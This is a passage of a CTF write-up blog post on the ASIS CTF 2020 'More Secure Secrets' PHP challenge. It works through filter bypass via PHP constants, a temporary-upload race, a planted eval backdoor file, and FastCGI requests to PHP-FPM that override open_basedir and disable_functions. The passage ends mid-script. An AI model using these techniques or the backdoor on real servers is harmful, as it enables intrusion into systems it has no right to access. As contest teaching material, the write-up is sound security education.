<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta content="width=device-width,initial-scale=1" name="viewport"><meta content="Abusing PHP Constants, Temporary Uploads, and FastCGI to Bypass Restrictions" property="og:title"><meta content="article" property="og:type"><meta content="2020-12-13" property="og:published_time"><meta content="Srikavin Ramkumar" property="og:author"><meta content="Writeup of ASISCTF 2020 Finals &#x27;More Secure Secrets&#x27; challenge. We bypass an &#x27;open_basedir&#x27; restriction, a character filter, and &#x27;disabled_functions&#x27; by abusing a race condition, stringing together defined constants, and sending a FastCGI request using a TCP socket. " property="og:description"><meta content="ctf-writeups" property="og:section"><meta content="asisctf20" property="og:tag"><meta content="web" property="og:tag"><meta content="php" property="og:tag"><meta content="rce" property="og:tag"><meta content="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/" property="og:url"><title>Abusing PHP Constants, Temporary Uploads, and FastCGI to Bypass Restrictions - srikavin.me</title><link href="/favicon.png" rel="icon"><link href="/bundle.css" rel="stylesheet"></head><body><nav><div class="nav-left"><span><a href="https://srikavin.me" class="name">Srikavin Ramkumar</a> </span><span><a href="/posts" class="nav-link">Posts</a> </span><span><a href="/tags" class="nav-link">Tags</a></span></div></nav><section class="section"><div class="container"><div class="page-container"><div class="blog-header"><h1 class="title">Abusing PHP Constants, Temporary Uploads, and FastCGI to Bypass Restrictions</h1><div class="subtitle"><span>Posted on <span class="date" title="Created: 2020-12-13">December 13, 2020 </span>in ctf-writeups</span></div><div class="tags"><a href="&#x2F;tags&#x2F;asisctf20&#x2F;"><span class="interactive minimal tag">asisctf20</span></a> <a href="&#x2F;tags&#x2F;web&#x2F;"><span class="interactive minimal tag">web</span></a> <a href="&#x2F;tags&#x2F;php&#x2F;"><span class="interactive minimal tag">php</span></a> <a href="&#x2F;tags&#x2F;rce&#x2F;"><span class="interactive minimal tag">rce</span></a></div></div><div class="blog-content light"><div class="blog-scrollspy"><h1 class="scrollspy-label">Table of Contents</h1><ul><li><a href="#challenge" data-target="challenge">Challenge</a></li><li><a href="#restrictions" data-target="restrictions">Restrictions</a><ul><li><a href="#limited-open-basedir" data-target="limited-open-basedir">Limited open_basedir</a></li><li><a href="#disabled-functions-and-classes" data-target="disabled-functions-and-classes">Disabled Functions and Classes</a></li></ul></li><li><a href="#executing-arbitrary-php" data-target="executing-arbitrary-php">Executing Arbitrary PHP</a><ul><li><a href="#php-constants" data-target="php-constants">PHP Constants</a></li><li><a href="#racing-upload-deletion" data-target="racing-upload-deletion">Racing Upload Deletion</a></li><li><a href="#including-the-temporary-upload" data-target="including-the-temporary-upload">Including the Temporary Upload</a></li></ul></li><li><a href="#bypassing-disable-functions-and-open-basedir" data-target="bypassing-disable-functions-and-open-basedir">Bypassing disable_functions and open_basedir</a><ul><li><a href="#listing-files" data-target="listing-files">Listing Files</a></li><li><a href="#abusing-fastcgi-over-tcp-sockets" data-target="abusing-fastcgi-over-tcp-sockets">Abusing FastCGI over TCP Sockets</a></li></ul></li><li><a href="#putting-it-all-together" data-target="putting-it-all-together">Putting it All Together</a></li></ul></div><h1 id="challenge">Challenge</h1><blockquote><p>Can you obtain the more <a href="https://securesecrets.asisctf.com/Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php">secure</a> secret? Even with all those filters? I don't think so :)</p></blockquote><p>We also have the <a href="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/configs.zip">configuration files</a> from the previous challenge <code>Less Secure Secrets</code>.</p><p>When we visit the given link, we see that the page prints out the source code of the current page:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">&lt;</span><span style="color:#63a35c;">html</span><span style="color:#323232;">&gt;&lt;</span><span style="color:#63a35c;">head</span><span style="color:#323232;">&gt;&lt;/</span><span style="color:#63a35c;">head</span><span style="color:#323232;">&gt;
&lt;</span><span style="color:#63a35c;">body</span><span style="color:#323232;">&gt;
&lt;</span><span style="color:#63a35c;">img </span><span style="color:#795da3;">width</span><span style="color:#323232;">=</span><span style="color:#183691;">&quot;300px&quot; </span><span style="color:#795da3;">src</span><span style="color:#323232;">=</span><span style="color:#183691;">&quot;/img.jpg&quot; </span><span style="color:#795da3;">style</span><span style="color:#323232;">=</span><span style="color:#183691;">&quot;</span><span style="color:#0086b3;">display</span><span style="color:#323232;">:block;</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">&gt;

&lt;?php
</span><span style="font-weight:bold;color:#a71d5d;">function </span><span style="font-weight:bold;color:#795da3;">no_errors_baby</span><span style="color:#323232;">($ab){
    </span><span style="font-weight:bold;color:#a71d5d;">die</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;I don&#39;t like errors and warnings&quot;</span><span style="color:#323232;">);
}
</span><span style="font-weight:bold;color:#a71d5d;">function </span><span style="font-weight:bold;color:#795da3;">no_race</span><span style="color:#323232;">($item, $key){}
    
</span><span style="color:#62a35c;">array_walk_recursive</span><span style="color:#323232;">($_SERVER, </span><span style="color:#183691;">&#39;no_race&#39;</span><span style="color:#323232;">);
</span><span style="color:#62a35c;">array_walk_recursive</span><span style="color:#323232;">($_GET, </span><span style="color:#183691;">&#39;no_race&#39;</span><span style="color:#323232;">);
</span><span style="color:#62a35c;">array_walk_recursive</span><span style="color:#323232;">($_POST, </span><span style="color:#183691;">&#39;no_race&#39;</span><span style="color:#323232;">);
</span><span style="color:#62a35c;">array_walk_recursive</span><span style="color:#323232;">($_REQUEST, </span><span style="color:#183691;">&#39;no_race&#39;</span><span style="color:#323232;">);
</span><span style="color:#62a35c;">set_error_handler </span><span style="color:#323232;">( </span><span style="color:#183691;">&quot;no_errors_baby&quot; </span><span style="color:#323232;">, </span><span style="color:#0086b3;">E_ALL </span><span style="color:#323232;">);

</span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">!</span><span style="color:#62a35c;">isset</span><span style="color:#323232;">($_GET[</span><span style="color:#183691;">&quot;yummy&quot;</span><span style="color:#323232;">])){
    </span><span style="color:#62a35c;">highlight_file</span><span style="color:#323232;">(</span><span style="color:#0086b3;">__FILE__</span><span style="color:#323232;">);
} </span><span style="font-weight:bold;color:#a71d5d;">else </span><span style="color:#323232;">{
    </span><span style="color:#62a35c;">sleep</span><span style="color:#323232;">(</span><span style="color:#0086b3;">2</span><span style="color:#323232;">); </span><span style="font-style:italic;color:#969896;">//Anti-race
    </span><span style="color:#62a35c;">echo </span><span style="color:#183691;">&quot;&lt;!--&quot;</span><span style="color:#323232;">;
    </span><span style="color:#62a35c;">phpinfo</span><span style="color:#323232;">(); 
    </span><span style="color:#62a35c;">echo </span><span style="color:#183691;">&quot;--&gt;&quot;</span><span style="color:#323232;">;
    </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;">(</span><span style="color:#62a35c;">preg_match</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;/</span><span style="color:#0086b3;">\$</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\?</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">`</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\&#39;</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">&quot;</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">%</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">!</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">[0-9]</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">@</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\(</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\)</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\^</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">&amp;</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\*</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">-</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\+</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">=</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">&lt;</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">&gt;</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\\|</span><span style="color:#183691;">{</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">}</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\/</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#0086b3;">\|</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">true</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">false</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">null</span><span style="font-weight:bold;color:#a71d5d;">|</span><span style="color:#183691;">secret/i&#39;</span><span style="color:#323232;">, $_GET[</span><span style="color:#183691;">&quot;yummy&quot;</span><span style="color:#323232;">]) 
        </span><span style="font-weight:bold;color:#a71d5d;">|| </span><span style="color:#62a35c;">strlen</span><span style="color:#323232;">($_GET[</span><span style="color:#183691;">&quot;yummy&quot;</span><span style="color:#323232;">]) </span><span style="font-weight:bold;color:#a71d5d;">&gt; </span><span style="color:#0086b3;">5000</span><span style="color:#323232;">)
        </span><span style="font-weight:bold;color:#a71d5d;">die</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;Don&#39;t try harder&quot;</span><span style="color:#323232;">);
    </span><span style="color:#62a35c;">eval</span><span style="color:#323232;">($_GET[</span><span style="color:#183691;">&quot;yummy&quot;</span><span style="color:#323232;">]);
}
?&gt;
&lt;/</span><span style="color:#63a35c;">body</span><span style="color:#323232;">&gt;
&lt;/</span><span style="color:#63a35c;">html</span><span style="color:#323232;">&gt;
</span></code></pre><span id="continue-reading"></span><h1 id="restrictions">Restrictions</h1><p>The interesting lines from the given <code>php.ini</code> in the config are the following:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">; Whether to allow </span><span style="color:#0086b3;">HTTP</span><span style="color:#323232;"> file uploads</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; </span><span style="color:#0086b3;">http://php.net/file-uploads
</span><span style="color:#323232;">file_uploads </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">On

</span><span style="color:#323232;">; Temporary directory for </span><span style="color:#0086b3;">HTTP</span><span style="color:#323232;"> uploaded files (will use system default </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;"> not
; specified)</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; </span><span style="color:#0086b3;">http://php.net/upload-tmp-dir
</span><span style="color:#323232;">upload_tmp_dir </span><span style="font-weight:bold;color:#a71d5d;">= /</span><span style="color:#323232;">tmp</span><span style="font-weight:bold;color:#a71d5d;">/</span><span style="color:#323232;">uploads</span><span style="font-weight:bold;color:#a71d5d;">/

</span><span style="color:#323232;">; open_basedir</span><span style="font-weight:bold;color:#a71d5d;">, if</span><span style="color:#323232;"> set</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;"> limits all file operations to the defined directory
; and below</span><span style="font-weight:bold;color:#a71d5d;">.</span><span style="color:#323232;">  This directive makes most sense </span><span style="font-weight:bold;color:#a71d5d;">if</span><span style="color:#323232;"> used in a per</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;">directory
; or per</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;">virtualhost web server configuration file</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; Note</span><span style="font-weight:bold;color:#a71d5d;">:</span><span style="color:#323232;"> disables the realpath cache
; </span><span style="color:#0086b3;">http://php.net/open-basedir
</span><span style="color:#323232;">open_basedir </span><span style="font-weight:bold;color:#a71d5d;">= /</span><span style="color:#323232;">var</span><span style="font-weight:bold;color:#a71d5d;">/</span><span style="color:#323232;">www</span><span style="font-weight:bold;color:#a71d5d;">/</span><span style="color:#323232;">html</span><span style="font-weight:bold;color:#a71d5d;">:/</span><span style="color:#323232;">tmp</span><span style="font-weight:bold;color:#a71d5d;">/

</span><span style="color:#323232;">; This directive allows you to disable certain functions</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; It receives a comma</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;">delimited list of </span><span style="font-weight:bold;color:#a71d5d;">function</span><span style="color:#323232;"> names</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; </span><span style="color:#0086b3;">http://php.net/disable-functions
</span><span style="color:#323232;">disable_functions </span><span style="font-weight:bold;color:#a71d5d;">=</span><span style="color:#323232;"> pcntl_alarm</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_fork</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_waitpid</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wait</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wifexited</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wifstopped</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wifsignaled</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">pcntl_wifcontinued</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wexitstatus</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wtermsig</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_wstopsig</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_signal</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_signal_get_handler</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_signal_dispatch</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">pcntl_get_last_error</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_strerror</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_sigprocmask</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_sigwaitinfo</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_sigtimedwait</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_exec</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_getpriority</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">pcntl_setpriority</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pcntl_async_signals</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">exec</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">passthru</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">shell_exec</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">system</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">proc_open</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">popen</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">posix_mkfifo</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pg_lo_import</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">dbmopen</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">dbase_open</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">chgrp</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">chown</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">chmod</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">symlink</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">apache_setenv</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">define_syslog_variables</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">posix_getpwuid</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">posix_kill</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">posix_setpgid</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">posix_setsid</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">posix_uname</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">proc_close</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">pclose</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">proc_nice</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">proc_terminate</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">curl_exec</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">curl_multi_exec</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">parse_ini_file</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">show_source</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">imap_open</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">imagecolormatch</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">fopen</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">copy</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">rename</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">readfile</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">readlink</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">tmpfile</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">tempnam</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">touch</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">link</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">file_put_contents</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">file</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">ftp_connect</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">ftp_ssl_connect</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">mail</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">putenv</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">chdir</span><span style="font-weight:bold;color:#a71d5d;">,
</span><span style="color:#323232;">ini_set</span><span style="font-weight:bold;color:#a71d5d;">,</span><span style="color:#323232;">parse_ini_string

; This directive allows you to disable certain classes</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; It receives a comma</span><span style="font-weight:bold;color:#a71d5d;">-</span><span style="color:#323232;">delimited list of class names</span><span style="font-weight:bold;color:#a71d5d;">.
</span><span style="color:#323232;">; </span><span style="color:#0086b3;">http://php.net/disable-classes
</span><span style="color:#323232;">disable_classes </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#0086b3;">FFI
</span></code></pre><h2 id="limited-open-basedir">Limited open_basedir</h2><p>The <code>open_basedir</code> option prevents us from reading and writing files from paths outside those that are specified. In this case, PHP limits our file operations to files above <code>/var/www/html</code> and <code>/tmp</code>.</p><h2 id="disabled-functions-and-classes">Disabled Functions and Classes</h2><p>These options are self-explanatory. If we try to use any of the listed functions or classes, PHP will throw an exception. The disabled functions prevent us from calling shell functions, writing files, and <a href="https://github.com/TarlogicSecurity/Chankro">bypassing restriction using LD_PRELOAD</a>.</p><h1 id="executing-arbitrary-php">Executing Arbitrary PHP</h1><p>Although the script evaluates our input, we are extremely limited in our input:</p><ul><li>No string literals</li><li>No numbers</li><li>No function calls</li><li>No variables</li><li>No assignments</li></ul><p>The first order of business is trying to find a way to execute arbitrary PHP. Notice that we can still include files if we can construct a string: <code>include [some constructed string];</code></p><p>If the error handler wasn't set, we could create strings by concatenating unquoted letters: <code>a . b</code>. However, PHP raises a warning <code>PHP Warning: Use of undefined constant b - assumed 'b' (this will throw an Error in a future version of PHP)</code> that is caught by the set error handler and execution is stopped.</p><h2 id="php-constants">PHP Constants</h2><p>PHP has globally defined constants. Using <a href="https://www.php.net/manual/en/function.get-defined-constants.php"><code>get_defined_constants</code></a>, we can get a list of all defined constants and their values. Since we can't call this function on the remote server, I ran it locally using the provided Docker setup.</p><p>Now that we have <a href="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/constants.txt">a list of constants mappings</a>, we need to use them to construct a string. Since we have both integer and string constants, we can index into a string constant using an integer constant. For example, since <code>LIBXML_NOENT =&gt; int(2)</code> and <code>LIBXML_LOADED_VERSION =&gt; string(5) &quot;20910&quot;</code>, we can execute <code>LIBXML_LOADED_VERSION[LIBXML_NOENT]</code> to get the character '9'.</p><p>I wrote <a href="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/create_mappings.py">a script</a> to create a mapping between letters and numbers to a version represented by constants. Not all characters were present within the string constants, but a large portion could be mapped to.</p><p>We can now include arbitrary local files.</p><h2 id="racing-upload-deletion">Racing Upload Deletion</h2><p>Whenever we upload a file, PHP temporarily stores it on disk. When the executing PHP script is finished, PHP deletes the temporary file. However, if we send another request before the first one finishes, the file will still exist.</p><p>For this method to work, we need to know the file path of the uploaded file. Luckily, the page runs <code>phpinfo()</code> which will print out the temporary path of the uploaded file. The challenge attempts to prevent race conditions by sleeping for 2 seconds and corrupting <code>$_SERVER</code>, <code>$_GET</code>, <code>$_POST</code>, and <code>$_REQUEST</code>.</p><p>I'm unsure if this was intended, but <code>$_FILES</code> was left untouched, so <code>phpinfo()</code> will still print out the temporary path of the uploaded file. We can also sidestep the <code>sleep(2)</code> before the <code>phpinfo()</code> by sending a payload that loops forever: <code>A: goto A;</code> Since the timeout in <code>php.ini</code> is set to 6 seconds, we still have 2 seconds to send another request after receiving the response from the first one.</p><h2 id="including-the-temporary-upload">Including the Temporary Upload</h2><p>In theory, the temporary upload should be deleted immediately after the PHP script finishes executing, but on the remote server and in the given docker container, using the above method resulted in the file remaining on disk. I assume this is either due to a bug in PHP or a result of PHP exiting abnormally after exceeding the maximum execution time.</p><p>Now that we have the path of the uploaded file on disk, we can use the mapping we created earlier to construct a PHP string and include it. This process was finicky and would take a few retries until all characters in the path could be mapped to, so I decided to use this method to create a file with the following contents (using <a href="https://www.php.net/manual/en/function.move-uploaded-file.php"><code>move_uploaded_file</code></a>) at <code>/tmp/uploads/dicedicedice.php</code>:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">&lt;?php
</span><span style="font-weight:bold;color:#a71d5d;">function </span><span style="font-weight:bold;color:#795da3;">print_errors</span><span style="color:#323232;">($ab, $errString){
    </span><span style="color:#62a35c;">echo</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;ERROR: &quot; </span><span style="font-weight:bold;color:#a71d5d;">. </span><span style="color:#323232;">$errString);
}
</span><span style="color:#62a35c;">set_error_handler </span><span style="color:#323232;">( </span><span style="color:#183691;">&quot;print_errors&quot; </span><span style="color:#323232;">, </span><span style="color:#0086b3;">E_ALL </span><span style="color:#323232;">);

</span><span style="color:#62a35c;">eval</span><span style="color:#323232;">($_GET[</span><span style="color:#183691;">&quot;real_eval&quot;</span><span style="color:#323232;">]);
</span></code></pre><p>Now we have a way to execute arbitrary PHP using the <code>real_eval</code> parameter:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">http://securesecrets.asisctf.com/Y0U_CANT_GUESS_THIS_5TUPLFGSGZYWXOKHINMBDWCKAGERCQJV.php?real_eval=var_dump($GLOBALS);&amp;yummy=include%20PHP_PREFIX%5BPHP_ZTS%5D.READLINE_LIB%5BLC_ALL%5D.PHP_SAPI%5BDNS_NS%5D.PHP_SAPI%5BDNS_A%5D.PHP_PREFIX%5BPHP_ZTS%5D.PHP_OS%5BLOCK_UN%5D.PHP_SAPI%5BDNS_A%5D.DATE_COOKIE%5BPHP_ZTS%5D.PHP_PREFIX%5BLC_ALL%5D.PHP_PREFIX%5BE_NOTICE%5D.DATE_RSS%5BLOCK_UN%5D.PHP_PREFIX%5BDNS_NS%5D.PHP_PREFIX%5BPHP_ZTS%5D.DATE_RSS%5BLOCK_UN%5D.PHP_OS%5BDNS_A%5D.PHP_PREFIX%5BINI_ALL%5D.READLINE_LIB%5BLOCK_UN%5D.DATE_RSS%5BLOCK_UN%5D.PHP_OS%5BDNS_A%5D.PHP_PREFIX%5BINI_ALL%5D.READLINE_LIB%5BLOCK_UN%5D.DATE_RSS%5BLOCK_UN%5D.PHP_OS%5BDNS_A%5D.PHP_PREFIX%5BINI_ALL%5D.READLINE_LIB%5BLOCK_UN%5D.PHP_VERSION%5BDNS_A%5D.PHP_SAPI%5BDNS_A%5D.PHP_LIBDIR%5BLOG_MAIL%5D.PHP_SAPI%5BDNS_A%5D%3B
</span></code></pre><h1 id="bypassing-disable-functions-and-open-basedir">Bypassing <code>disable_functions</code> and <code>open_basedir</code></h1><p>Even though we can execute arbitrary PHP, there's not much we can do with <code>disable_functions</code> and <code>open_basedir</code> restrictions in place.</p><h2 id="listing-files">Listing Files</h2><p>The <a href="https://www.php.net/manual/en/wrappers.glob.php"><code>glob</code></a> protocol, which seems useless for most practical purposes, produces a list of all files that match a given pattern. Although there was <a href="https://bugs.php.net/bug.php?id=73891">a bug report</a> in 2017 about using this protocol to read directory structures outside <code>open_basedir</code>, this still appears to work in PHP 7.3.2.</p><p>Executing the following script on the server shows the list of all uploaded files:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">$it = new DirectoryIterator(&quot;glob:///tmp/uploads/*&quot;);
foreach($it as $f) {  
    echo $f-&gt;getFileName() . &quot; &lt;</span><span style="color:#63a35c;">br</span><span style="color:#323232;">/&gt;&quot;;
}
</span></code></pre><p><img alt="Screenshot of uploaded files" src="/posts/asisctf20-abusing-php-constants-to-bypass-eval-filters/uploaded_files.png"></p><p>This doesn't let us do much since we can only list files.</p><h2 id="abusing-fastcgi-over-tcp-sockets">Abusing FastCGI over TCP Sockets</h2><blockquote><p>PHP-FPM (FastCGI Process Manager) is an alternative PHP FastCGI implementation with some additional features useful for sites of any size, especially busier sites.</p></blockquote><p>PHP-FPM is responsible for interfacing PHP scripts with a web server (like Apache or Nginx). It can be configured to use UNIX sockets or TCP sockets. In this case PHP-FPM runs in a separate docker container from the web server and communicates using a TCP socket on port 9000.</p><p>PHP-FPM treats the <code>PHP_VALUE</code> FastCGI headers as the same as defining it within a <code>php.ini</code> file. Normally, this wouldn't be an issue as the attacker has no way of controlling FastCGI headers since those are set by the webserver (in this case Apache). However, since we can execute arbitrary PHP on the server, we can just create a socket connection on port 9000 ourselves and send a FastCGI request with a <code>PHP_VALUE</code> header that overwrites the <code>open_basedir</code> configuration value.</p><p>I wrote the following PHP script that opens a TCP socket to localhost on port 9000 and writes the raw POST body of the request, and echos back the response it gets:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">&lt;?php

$fp </span><span style="font-weight:bold;color:#a71d5d;">= </span><span style="color:#62a35c;">fsockopen</span><span style="color:#323232;">(</span><span style="color:#183691;">&quot;127.0.0.1&quot;</span><span style="color:#323232;">, </span><span style="color:#0086b3;">9000</span><span style="color:#323232;">, $errno, $errstr, </span><span style="color:#0086b3;">30</span><span style="color:#323232;">);

</span><span style="font-weight:bold;color:#a71d5d;">if </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">!</span><span style="color:#323232;">$fp) {
    </span><span style="color:#62a35c;">echo </span><span style="color:#183691;">&quot;</span><span style="color:#323232;">$errstr</span><span style="color:#183691;"> (</span><span style="color:#323232;">$errno</span><span style="color:#183691;">)&lt;br /&gt;</span><span style="color:#0086b3;">\n</span><span style="color:#183691;">&quot;</span><span style="color:#323232;">;
}

</span><span style="color:#62a35c;">fwrite</span><span style="color:#323232;">($fp, </span><span style="color:#62a35c;">file_get_contents</span><span style="color:#323232;">(</span><span style="color:#183691;">&#39;php://input&#39;</span><span style="color:#323232;">));

</span><span style="font-weight:bold;color:#a71d5d;">while </span><span style="color:#323232;">(</span><span style="font-weight:bold;color:#a71d5d;">!</span><span style="color:#62a35c;">feof</span><span style="color:#323232;">($fp)) {
    </span><span style="color:#62a35c;">echo fgets</span><span style="color:#323232;">($fp, </span><span style="color:#0086b3;">128</span><span style="color:#323232;">);
}
</span><span style="color:#62a35c;">fclose</span><span style="color:#323232;">($fp);
</span></code></pre><h1 id="putting-it-all-together">Putting it All Together</h1><p>I used <a href="https://github.com/adoy/PHP-FastCGI-Client"><code>PHP-FastCGI-Client</code></a> to generate the raw request locally. I captured the binary FastCGI request of running the following script:</p><pre style="background-color:#ffffff;">
<code><span style="color:#323232;">&lt;?php
</span><span style="font-weight:bold;color:#a71d5d;">require </span><span style="color:#183691;">&#39;vendor/autoload.php&#39;</span><span style="color:#323232;">;

</span><span style="font-weight:bold;color:#a71d5d;">use </span><span style="color:#323232;">Adoy\FastCGI\</span><span style="color:#0086b3;">Client</span><span style="color:#323232;">;

